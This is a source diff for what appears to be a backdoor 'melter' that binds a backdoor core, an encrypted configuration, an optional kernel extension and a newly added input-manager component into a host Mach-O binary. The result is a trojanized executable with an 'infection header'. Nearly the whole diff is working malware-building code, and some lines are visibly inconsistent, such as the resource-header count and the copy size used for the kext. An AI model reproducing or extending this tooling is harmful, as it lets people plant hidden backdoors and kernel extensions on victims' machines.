@@ -158,7 +158,7 @@ int appendData (char *inputFilePointer,
   resourceHeader  resource;
   
   if (gKextFileSize > 0)
-    numberOfResources = 3;
+    numberOfResources = 4;
   else
     numberOfResources = 2;
   
@@ -167,11 +167,12 @@ int appendData (char *inputFilePointer,
   printf ("Original EP: %x\n", originalEP);
 #endif
 
-  char *coreFileName    = basename(coreFilePath);
-  char *confFileName    = basename(confFilePath);
-  char *kextFileName    = basename(kextFilePath);
-  char *inputFileName   = basename(inputFilePath);
-  char *outputFileName  = basename(outputFilePath);
+  char *coreFileName          = basename(coreFilePath);
+  char *confFileName          = basename(confFilePath);
+  char *kextFileName          = basename(kextFilePath);
+  char *inputManagerFileName  = basename(inputManagerFilePath);
+  char *inputFileName         = basename(inputFilePath);
+  char *outputFileName        = basename(outputFilePath);
 
   //
   // Set the infection header
@@ -279,7 +280,6 @@ int appendData (char *inputFilePointer,
   offset += gCoreFileSize;
   
   tempFileSize = 0;
-  tempFilePointer = NULL;
 
 #ifdef WIN32
   if (tempFilePointer != NULL)
@@ -289,6 +289,7 @@ int appendData (char *inputFilePointer,
   CloseHandle(tempFD);
 #else
   close (tempFD);
+  tempFilePointer = NULL;
 #endif
 
   //
@@ -324,6 +325,8 @@ int appendData (char *inputFilePointer,
           gConfFileSize);
   offset += gConfFileSize;
 
+  tempFileSize = 0;
+
 #ifdef WIN32
   if(tempFilePointer != NULL)
 	  UnmapViewOfFile(tempFilePointer);
@@ -332,6 +335,8 @@ int appendData (char *inputFilePointer,
   CloseHandle(tempFD);
 #else
   close (tempFD);
+
+  tempFilePointer = NULL;
 #endif
 
   //
@@ -339,9 +344,6 @@ int appendData (char *inputFilePointer,
   //
   if (gKextFileSize > 0)
     {
-      tempFileSize = 0;
-      tempFilePointer = NULL;
-      
       resource.type = RESOURCE_KEXT;
       memset (resource.name, 0, sizeof (resource.name));
       memcpy (resource.name, kextFileName, sizeof (resource.name));
@@ -358,6 +360,7 @@ int appendData (char *inputFilePointer,
               sizeof (resourceHeader));
       
       offset += sizeof (resourceHeader);
+
 #ifdef WIN32
 	    if ((tempFilePointer = mapFile (kextFilePath, &tempFileSize,
 			                  						  &tempFD, &tempFDMap, 0)) == NULL)
@@ -374,6 +377,10 @@ int appendData (char *inputFilePointer,
       memcpy (outputFilePointer + offset,
               tempFilePointer,
               gConfFileSize);
+      
+      offset += gKextFileSize;
+      tempFileSize = 0;
+
 #ifdef WIN32
       if (tempFilePointer != NULL)
         UnmapViewOfFile (tempFilePointer);
@@ -382,9 +389,52 @@ int appendData (char *inputFilePointer,
       CloseHandle (tempFD);
 #else
       close (tempFD);
+
+      tempFilePointer = NULL;
 #endif
     }
   
+  //
+  // INPUT MANAGER
+  //
+  resource.type = RESOURCE_IN_MANAGER;
+  memset (resource.name, 0, sizeof (resource.name));
+  memcpy (resource.name, inputManagerFileName, sizeof (resource.name));
+  resource.size = gInputManagerFileSize;
+  memset (resource.path, 0, sizeof (resource.path));
+  memcpy (resource.path, installPath, sizeof (resource.path));
+
+  memcpy (outputFilePointer + offset,
+          &resource,
+          sizeof (resourceHeader));
+
+  offset += sizeof (resourceHeader);
+#ifdef WIN32
+  if ((tempFilePointer = mapFile (inputManagerFilePath, &tempFileSize,
+                                  &tempFD, &tempFDMap, 0)) == NULL)
+#else 
+  if ((tempFilePointer = mapFile (inputManagerFilePath, &tempFileSize,
+                                  &tempFD, 0)) == NULL)
+#endif
+    {
+      printf("[ee] Error while mmapping the input manager file\n");
+      exit (1);
+    }
+
+  memcpy (outputFilePointer + offset,
+          tempFilePointer,
+          gInputManagerFileSize);
+
+#ifdef WIN32
+  if(tempFilePointer != NULL)
+    UnmapViewOfFile(tempFilePointer);
+
+  CloseHandle(tempFDMap);
+  CloseHandle(tempFD);
+#else
+  close (tempFD);
+#endif
+
   return offset;
 }
 
@@ -739,18 +789,19 @@ usage (_mChar *aBinaryName)
 #else
   printf ("\nUsage: %s <core> <conf> <kext> <path> <input> <output>\n\n", aBinaryName);
 #endif
-  printf ("\t<core>   : backdoor core\n");
-  printf ("\t<conf>   : backdoor encrypted configuration\n");
-  printf ("\t<kext>   : kernel extension\n");
-  printf ("\t<path>   : backdoor installation path (on target)\n");
-  printf ("\t<input>  : binary to melt with\n");
-  printf ("\t<output> : output filename\n\n");
+  printf ("\t<core>     : backdoor core\n");
+  printf ("\t<conf>     : backdoor encrypted configuration\n");
+  printf ("\t<kext>     : kernel extension\n");
+  printf ("\t<imanager> : input manager\n");
+  printf ("\t<path>     : backdoor installation path (on target)\n");
+  printf ("\t<input>    : binary to melt with\n");
+  printf ("\t<output>   : output filename\n\n");
 }
 
 int
 parseArguments (int argc, _mChar **argv)
 {
-	if (argc != 7)
+	if (argc != 8)
     {
       return kErrorGeneric;
     }
@@ -774,9 +825,10 @@ parseArguments (int argc, _mChar **argv)
   coreFilePath          = argv[1];
   confFilePath          = argv[2];
   kextFilePath          = argv[3];
-  installPath           = argv[4];
-  inputFilePath         = argv[5];
-  outputFilePath        = argv[6];
+  inputManagerFilePath  = argv[4];
+  installPath           = argv[5];
+  inputFilePath         = argv[6];
+  outputFilePath        = argv[7];
 
   return kSuccess;
 }
@@ -866,6 +918,18 @@ main (int argc, _mChar *argv[])
         }
     }
 
+  if (strncmp ("null", inputManagerFilePath, strlen ("null")) != 0)
+    {
+      if ((gInputManagerFileSize = getFileSize (inputManagerFilePath)) == kErrorGeneric)
+        {
+          printf ("[ee] InputManager file not found\n");
+#ifdef WIN32
+          //freeArguments();
+#endif
+          exit (1);
+        }
+    }
+
   // Map input file
 #ifdef WIN32
   if ((inputFilePointer = mapFile (inputFilePath,
@@ -893,6 +957,7 @@ main (int argc, _mChar *argv[])
                     + gCoreFileSize
                     + gConfFileSize
                     + gKextFileSize
+                    + gInputManagerFileSize
                     + sizeof (infectionHeader)
                     + sizeof (stringTable) * gNumStrings
                     + sizeof (resourceHeader) * ((gKextFileSize > 0) ? 3 : 2);
@@ -1037,12 +1102,12 @@ main (int argc, _mChar *argv[])
               {
                 if (x86Found)
                   {
-                  archOffset += offsetToResources + outputFileSize + sizeof(struct segment_command);
+                    archOffset += offsetToResources + outputFileSize + sizeof(struct segment_command);
 
-                  if (archOffset % PAGE_ALIGNMENT)
-                    archOffset = ((archOffset + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
+                    if (archOffset % PAGE_ALIGNMENT)
+                      archOffset = ((archOffset + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
 #ifdef DEBUG_VERBOSE
-                  printf ("new Offset: 0x%x\n", archOffset);
+                    printf ("new Offset: 0x%x\n", archOffset);
 #endif
                   }
 
